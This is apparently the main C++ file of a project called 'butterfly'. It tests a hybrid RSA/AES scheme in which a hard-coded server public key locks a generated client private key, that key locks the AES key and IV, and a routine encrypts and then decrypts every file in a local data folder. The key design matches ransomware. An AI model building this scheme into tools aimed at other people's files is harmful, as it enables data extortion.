
#include <memory>

#include "argumentParser.h"
#include "directoryIterator.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "aesKeyDatabase.h"

void test_rsa_enc()
{
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));

    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));

    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile.substr(0, cprivateRSAKeyFile.size() - 1));
    //rsaEncryptCPrivateRSA->encrypt(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile);

    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();

    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

}

void test_rsa_dec()
{
    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->getBinKeyFileContents("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    rsaDecryptor->decrypt(rsaDecryptor->getEvpPkey(), encCPrivateRSA);
    std::string decrpyted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrpyted.c_str(), static_cast<long>(decrpyted.length()));
    std::cout << "Decrypted: " << decrpyted.size() << std::endl;
}

void test_rsa_enc_evp()
{
    // Init rsaEncryptCPrivateRSA with SPUBLIC_PEM
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA (new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
    // Init rsaEncryptAESKey with keysize 2048
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey(new butterfly::rsa::RSAEncryptor(2048));


    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    butterfly::writeBinFile("CPrivateRSA.pem", cprivateRSAKeyFile.c_str(), static_cast<long>(cprivateRSAKeyFile.length()));
    // Encrypt the CPrivateRSA.pem
    rsaEncryptCPrivateRSA->encryptEVP(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile, butterfly::ENC_CPRIVATERSA_FILENAME);
    // Get the encrypted CPrivateRSA.bin string
    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();
    // save the encrypted CPrivateRSA.bin string to CPrivateRSA.bin file
    rsaEncryptCPrivateRSA->saveEncryptedMsgToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, static_cast<int>(encCPrivateRSA.length()));

    // Encrypt the AESKey
    rsaEncryptAESKey->encryptEVP(rsaEncryptAESKey->getEvpPkey(), "abcdef", butterfly::ENC_AESKEY_FILENAME);
    std::string encAESKey = rsaEncryptAESKey->getEncryptedMessage();
    rsaEncryptAESKey->saveEncryptedMsgToFile("AESKey.bin", encAESKey, static_cast<int>(encAESKey.length()));

    // Encrypt the AESIV
    rsaEncryptAESKey->encryptEVP(rsaEncryptAESKey->getEvpPkey(), "bbbbb", butterfly::ENC_AESIV_FILENAME);
    std::string encAESIV = rsaEncryptAESKey->getEncryptedMessage();
    rsaEncryptAESKey->saveEncryptedMsgToFile("AESIV.bin", encAESIV, static_cast<int>(encAESIV.length()));
};

void test_rsa_dec_evp()
{

    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor(new butterfly::rsa::RSADecryptor("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem"));

    std::string encCPrivateRSA = rsaDecryptor->getBinKeyFileContents("CPrivateRSA.bin");

    std::cout << "Enc: " << encCPrivateRSA << std::endl;
    rsaDecryptor->decryptEVP(rsaDecryptor->getEvpPkey(), encCPrivateRSA, butterfly::ENC_CPRIVATERSA_FILENAME);

    std::string decrypted = rsaDecryptor->getDecryptedMessage();
    butterfly::writeBinFile("CPrivateRSA.pem.dec", decrypted.c_str(), static_cast<long>(decrypted.length()));
    std::cout << "Decrypted: " << decrypted.size() << std::endl;


    std::unique_ptr<butterfly::rsa::RSADecryptor> rsaDecryptor2(new butterfly::rsa::RSADecryptor(decrypted));
    std::string encAESKey = rsaDecryptor2->getBinKeyFileContents("AESKey.bin");
    rsaDecryptor2->decryptEVP(rsaDecryptor2->getEvpPkey(), encAESKey, butterfly::ENC_AESKEY_FILENAME);
    std::string decryptedAESKey = rsaDecryptor2->getDecryptedMessage();
    std::cout << "Decrypted AESKey: " << decryptedAESKey << std::endl;

    std::string encAESIV = rsaDecryptor2->getBinKeyFileContents("AESIV.bin");
    rsaDecryptor2->decryptEVP(rsaDecryptor2->getEvpPkey(), encAESIV, butterfly::ENC_AESIV_FILENAME);
    std::string decryptedAESIV= rsaDecryptor2->getDecryptedMessage();
    std::cout << "Decrypted AESIV: " << decryptedAESIV << std::endl;

}

int main(int argc, char *argv[])
{
    // parse args with the argument parser
    std::unique_ptr<butterfly::ArgumentParser> argparse(new butterfly::ArgumentParser());
    butterfly::ArgumentParser::Arguments arg = argparse->parseArgs(argc, argv);

    LOG_INFO("Start application " << PROJECT_NAME << " with version " << arg._version);
    std::cout << argc << *argv <<std::endl;
    //test_rsa_enc_evp();
    //sleep(2);
    //test_rsa_dec_evp();
    //exit(1);
    int i = 0;
    /////// Hybrid Part ////////
    while (i < 2)
    {
        // start encryption
        std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
        encryptor->invokeDir("/home/christian/projects/butterfly/bin/data");

        sleep(2);

        // start decryption
        std::unique_ptr<butterfly::hybrid::Decryptor> decryptor(new butterfly::hybrid::Decryptor());
        std::string cprivate = decryptor->decryptCPrivateRSA("/home/christian/projects/butterfly/masterkeys/SPrivateRSA.pem", "CPrivateRSA.bin");
        //butterfly::writeBinFile("CPrivateRSA.pem.dec", cprivate.c_str(), static_cast<long>(cprivate.length()));

        decryptor->invokeDir("/home/christian/projects/butterfly/bin/data");

        i++;
        LOG_INFO("NEW HYBRID ENCRYPTION ROUND " << i);
        sleep(10);

    }



    ////// AES PART ///////
    /*
    std::unique_ptr<butterfly::aes::AESEncryptor> aesEncryptor(new butterfly::aes::AESEncryptor());
    aesEncryptor->generateAESKey();
    std::string aeskey = aesEncryptor->getAESKey();
    std::string aesiv = aesEncryptor->getAESIv();
    butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
    butterfly::writeBinFile("AESIv.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
    std::string s = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesEncryptor->encryptFile(s);


    sleep(2);
    std::unique_ptr<butterfly::aes::AESDecryptor> aesDecryptor(new butterfly::aes::AESDecryptor());
    std::string aeskey2 = butterfly::readBinFile("AESKey.txt");
    std::string aesiv2 = butterfly::readBinFile("AESIv.txt");
    aesDecryptor->setAESKey(aeskey2);
    aesDecryptor->setAESIv(aesiv2);
    std::string s2 = "/home/christian/projects/butterfly/bin/data/test.pdf";
    aesDecryptor->decryptFile(s2);
    */
    
     return 0;
}